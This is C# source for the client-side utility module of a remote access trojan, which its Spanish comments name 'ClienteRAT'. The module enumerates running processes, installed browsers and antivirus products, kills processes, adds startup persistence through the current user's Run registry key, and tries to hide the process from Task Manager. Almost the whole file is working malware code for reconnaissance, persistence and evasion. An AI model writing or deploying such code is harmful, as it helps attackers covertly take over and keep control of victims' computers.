using Client.Native;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading.Tasks;

namespace Client.Util
{
    static class Functions
    {
        public static string ListProcesses()
        {
            StringBuilder processList = new StringBuilder();
            Process[] processes = Process.GetProcesses();
            foreach (Process process in processes)
            {
                processList.AppendLine($"{process.ProcessName} (ID: {process.Id})");
            }
            return processList.ToString();
        }

        public static string ListInstalledBrowsers()
        {
            StringBuilder browsersList = new StringBuilder();

            // Lista de rutas típicas de instalación de navegadores
            string[] browserPaths = {
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "Google", "Chrome", "Application", "chrome.exe"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "Google", "Chrome", "Application", "chrome.exe"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Google", "Chrome", "Application", "chrome.exe"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "Mozilla Firefox", "firefox.exe"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "Mozilla Firefox", "firefox.exe"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Mozilla Firefox", "firefox.exe"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "Opera", "launcher.exe"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "Opera", "launcher.exe"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Opera", "launcher.exe"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "Internet Explorer", "iexplore.exe"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "Internet Explorer", "iexplore.exe"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Edge", "Application", "msedge.exe"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "Microsoft", "Edge", "Application", "msedge.exe"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Edge", "SxS", "Application", "msedge.exe")
            };
            browsersList.AppendLine("\n");
            browsersList.AppendLine("====================================================================");
            browsersList.AppendLine("|                       Navegadores Instalados                     |");
            browsersList.AppendLine("====================================================================");

            foreach (var browserPath in browserPaths)
            {
                if (File.Exists(browserPath))
                {
                    browsersList.AppendLine($"{browserPath,-55} ");
                }
            }

            browsersList.AppendLine("====================================================================");

            return browsersList.ToString();
        }



        public static string KillProcess(int pid)
        {
            try
            {
                Process process = Process.GetProcessById(pid);
                if (process != null)
                {
                    process.Kill();
                    return $"Proceso con PID {pid} terminado correctamente.";
                }
                else
                {
                    return $"No se encontró ningún proceso con PID {pid}.";
                }
            }
            catch (ArgumentException)
            {
                return $"No se encontró ningún proceso con PID {pid}.";
            }
            catch (Exception ex)
            {
                return $"Error al intentar terminar el proceso: {ex.Message}";
            }
        }

       

        public static void AddPersistence()
        {
            try
            {
                // Ruta al ejecutable del cliente RAT
                string executablePath = Process.GetCurrentProcess().MainModule.FileName;

                // Clave de registro donde se añadirá la entrada de inicio
                string keyName = @"Software\Microsoft\Windows\CurrentVersion\Run";

                // Abrir la clave de registro
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(keyName, true))
                {
                    if (key == null)
                    {
                        // La clave no existe, crearla
                        using (RegistryKey newKey = Registry.CurrentUser.CreateSubKey(keyName))
                        {
                            newKey.SetValue("ClienteRAT", executablePath);
                            Console.WriteLine("Entrada de registro creada con éxito.");
                        }
                    }
                    else
                    {
                        // La clave ya existe, actualizar el valor si es necesario
                        object existingValue = key.GetValue("ClienteRAT");
                        if (existingValue == null || existingValue.ToString() != executablePath)
                        {
                            key.SetValue("ClienteRAT", executablePath);
                            Console.WriteLine("Entrada de registro actualizada con éxito.");
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error al modificar el registro: {ex.Message}");
            }
        }

        public static void HideFromTaskManager()
        {
            try
            {
                // Obtener el handle del proceso actual
                IntPtr hProcess = Process.GetCurrentProcess().Handle;

                // Ocultar el proceso del Administrador de Tareas
                bool success = NativeMethods.SetProcessHideFromDebugger(hProcess);
               
            }
            catch (Exception ex)
            {
                
            }
        }

        public static string ListInstalledAntivirus()
        {
            StringBuilder antivirusList = new StringBuilder();

            try
            {
                // Especifica el ámbito de búsqueda
                ManagementScope scope = new ManagementScope(@"\\.\root\SecurityCenter2");
                scope.Connect();  // Conectar al ámbito

                // Define la consulta
                ObjectQuery query = new ObjectQuery("SELECT * FROM AntivirusProduct");

                // Ejecuta la consulta
                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query))
                using (ManagementObjectCollection collection = searcher.Get())
                {
                    antivirusList.AppendLine("Antivirus instalados:");

                    foreach (ManagementBaseObject antivirus in collection)
                    {
                        string antivirusName = antivirus["displayName"]?.ToString() ?? "Nombre desconocido";
                        antivirusList.AppendLine(antivirusName);
                    }
                }
            }
            catch (UnauthorizedAccessException uae)
            {
                antivirusList.AppendLine($"Error de acceso no autorizado al obtener los antivirus instalados: {uae.Message}");
            }
            catch (ManagementException me)
            {
                antivirusList.AppendLine($"Error de gestión al obtener los antivirus instalados: {me.Message}");
            }
            catch (Exception ex)
            {
                antivirusList.AppendLine($"Error general al obtener los antivirus instalados: {ex.Message}");
            }

            return antivirusList.ToString();
        }


    }
}
